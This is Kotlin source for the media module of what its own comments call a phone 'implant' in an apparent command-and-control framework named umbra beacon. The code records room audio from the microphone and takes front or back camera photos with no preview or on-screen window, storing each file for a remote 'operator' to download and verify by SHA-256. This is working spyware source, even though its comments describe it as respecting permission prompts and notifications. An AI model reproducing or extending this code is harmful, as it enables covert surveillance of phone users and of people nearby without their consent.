package io.umbra.beacon

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Handler
import android.os.HandlerThread
import java.io.File
import java.security.MessageDigest
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * The ears and the eyes of the phone.
 *
 * The microphone and the camera are the two capabilities of a phone that
 * no other implant of the framework has: the desktop implants take the
 * screen and the keyboard, and the phone takes the sound and the picture.
 *
 * Both of them are honest about what the platform does:
 *
 *   * the microphone of a phone in the background needs a foreground
 *     service of the type "microphone", and the operator sees a
 *     notification while it runs -- the implant does not hide that;
 *   * the camera needs the user to have granted the permission, and it
 *     fails when another application holds the camera;
 *   * the shutter of the camera makes a sound on some phones and shows a
 *     flash on others, and no application may hide that.
 */
object Media {
    /** How long a collector waits for the hardware. */
    const val TIMEOUT_MS = 30_000L

    /** The width of the picture. */
    const val WIDTH = 1280

    /** The height of the picture. */
    const val HEIGHT = 720

    /**
     * One capture: the file on the phone and what is in it.
     *
     * The file is the truth of the capture: the operator pulls it with
     * the ordinary `download` task, chunk by chunk, and the digest makes
     * the transfer verifiable.
     */
    class Capture(
        val kind: String,
        val path: String,
        val size: Long,
        val sha256: String,
        val note: String,
        val inline: ByteArray? = null,
    ) {
        /** The capture as text. */
        fun text(): String {
            val out = StringBuilder()
            out.append("$kind: the capture is at $path\n")
            out.append("$kind: $size bytes, sha256 $sha256\n")
            if (note.isNotEmpty()) out.append("$kind: $note\n")
            return out.toString()
        }

        /** The capture as a value. */
        fun value(): Upk {
            return Upk.map(
                "kind" to Upk.str(kind),
                "path" to Upk.str(path),
                "size" to Upk.num(size),
                "sha256" to Upk.str(sha256),
                "note" to Upk.str(note),
            )
        }
    }

    /**
     * The sound of the room.
     *
     * The recorder writes an m4a file into the state of the implant; the
     * operator pulls it with `download`.  The recording is bounded: the
     * task asks for a number of seconds and the phone records exactly
     * that many.
     */
    fun record(context: Context, seconds: Int, directory: String): Capture {
        val limit = seconds.coerceIn(1, 900)
        if (!Sense.granted(context, android.Manifest.permission.RECORD_AUDIO)) {
            return Capture(
                "media.mic",
                "",
                0,
                "",
                "the microphone permission is not granted: the user of the phone has to press it",
            )
        }
        val file = File(directory, "mic-${System.currentTimeMillis()}.m4a")
        val recorder = MediaRecorder(context)
        var note = ""
        return try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setAudioEncodingBitRate(64_000)
            recorder.setAudioSamplingRate(44_100)
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            recorder.start()
            Thread.sleep(limit * 1000L)
            try {
                recorder.stop()
            } catch (t: Throwable) {
                note = "the recorder was cut short: ${t.message ?: "the microphone was taken away"}"
            }
            recorder.release()
            val bytes = if (file.isFile) file.readBytes() else ByteArray(0)
            Capture(
                "media.mic",
                file.absolutePath,
                file.length(),
                digest(bytes),
                if (note.isEmpty()) "recorded $limit seconds" else note,
            )
        } catch (t: Throwable) {
            try {
                recorder.release()
            } catch (_: Throwable) {
                // The recorder was never prepared.
            }
            Capture(
                "media.mic",
                "",
                0,
                "",
                "the microphone could not be opened: ${t.message ?: "the system refused"}",
            )
        }
    }

    /**
     * The picture of the room.
     *
     * The camera of the platform is opened for one picture and closed
     * again: no preview, no window on the screen of the user, and the
     * file is a jpeg that any tool can read.
     */
    fun photograph(context: Context, facing: String, directory: String): Capture {
        if (!Sense.granted(context, android.Manifest.permission.CAMERA)) {
            return Capture(
                "media.camera",
                "",
                0,
                "",
                "the camera permission is not granted: the user of the phone has to press it",
            )
        }
        val bytes = grab(context, facing)
        if (bytes == null || bytes.isEmpty()) {
            return Capture(
                "media.camera",
                "",
                0,
                "",
                "the camera could not be opened: another application holds it, or the hardware refused",
            )
        }
        val file = File(directory, "camera-${System.currentTimeMillis()}.jpg")
        return try {
            file.writeBytes(bytes)
            Capture(
                "media.camera",
                file.absolutePath,
                file.length(),
                digest(bytes),
                "the picture of the ${if (facing == "front") "front" else "back"} camera",
            )
        } catch (t: Throwable) {
            Capture(
                "media.camera",
                "",
                bytes.size.toLong(),
                digest(bytes),
                "the picture could not be written: ${t.message}",
                bytes,
            )
        }
    }

    /**
     * One picture of the camera.
     *
     * The capture is done in three steps: the camera is opened, a
     * session is built on the reader, and the picture arrives in the
     * reader.  The wait is bounded, so a camera that is busy does not
     * hold the beacon.
     */
    private fun grab(context: Context, facing: String): ByteArray? {
        val manager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return null
        val cameraId = pick(manager, facing) ?: return null
        val reader = ImageReader.newInstance(WIDTH, HEIGHT, ImageFormat.JPEG, 2)
        val latch = CountDownLatch(1)
        var failure = ""
        var bytes: ByteArray? = null
        val thread = HandlerThread("umbra-camera")
        thread.start()
        val handler = Handler(thread.looper)
        reader.setOnImageAvailableListener({ source ->
            val image = source.acquireNextImage() ?: return@setOnImageAvailableListener
            try {
                val buffer = image.planes[0].buffer
                val data = ByteArray(buffer.remaining())
                buffer.get(data)
                bytes = data
            } catch (t: Throwable) {
                failure = t.message ?: "the picture could not be read"
            } finally {
                image.close()
            }
            latch.countDown()
        }, handler)
        val callback = object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                try {
                    val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    request.addTarget(reader.surface)
                    @Suppress("DEPRECATION")
                    camera.createCaptureSession(
                        listOf(reader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    session.capture(request.build(), null, handler)
                                } catch (t: Throwable) {
                                    failure = t.message ?: "the picture could not be taken"
                                    latch.countDown()
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                failure = "the camera session could not be configured"
                                latch.countDown()
                            }
                        },
                        handler,
                    )
                } catch (t: Throwable) {
                    failure = t.message ?: "the camera session could not be built"
                    latch.countDown()
                }
            }

            override fun onDisconnected(camera: CameraDevice) {
                failure = "the camera was disconnected"
                latch.countDown()
            }

            override fun onError(camera: CameraDevice, error: Int) {
                failure = "the camera failed with the code $error"
                latch.countDown()
            }
        }
        return try {
            manager.openCamera(cameraId, callback, handler)
            latch.await(TIMEOUT_MS, TimeUnit.MILLISECONDS)
            bytes
        } catch (e: SecurityException) {
            // CAMERA is a permission the user grants; the platform refuses
            // the camera before a single frame arrives when it is missing.
            failure = "the camera permission is not granted: ${e.message ?: "the platform refused"}"
            null
        } catch (t: Exception) {
            failure = failure.ifEmpty { "the camera could not be opened: ${t.message}" }
            null
        } finally {
            try {
                reader.close()
            } catch (_: Throwable) {
                // The reader was already closed.
            }
            thread.quitSafely()
        }
    }

    /**
     * The camera the operator asked for.
     *
     * The back camera is the one that sees the room; the front one sees
     * the face of the user.  When the phone has only one camera, that one
     * is the answer.
     */
    private fun pick(manager: CameraManager, facing: String): String? {
        val wanted = if (facing == "front") {
            CameraCharacteristics.LENS_FACING_FRONT
        } else {
            CameraCharacteristics.LENS_FACING_BACK
        }
        val ids = try {
            manager.cameraIdList
        } catch (_: Throwable) {
            return null
        }
        for (id in ids) {
            val characteristics = try {
                manager.getCameraCharacteristics(id)
            } catch (_: Throwable) {
                continue
            }
            if (characteristics.get(CameraCharacteristics.LENS_FACING) == wanted) return id
        }
        return ids.firstOrNull()
    }

    /** The digest of the bytes, so the transfer can be checked. */
    fun digest(data: ByteArray): String {
        val hash = MessageDigest.getInstance("SHA-256").digest(data)
        val out = StringBuilder(hash.size * 2)
        for (b in hash) out.append("%02x".format(b.toInt() and 0xff))
        return out.toString()
    }
}
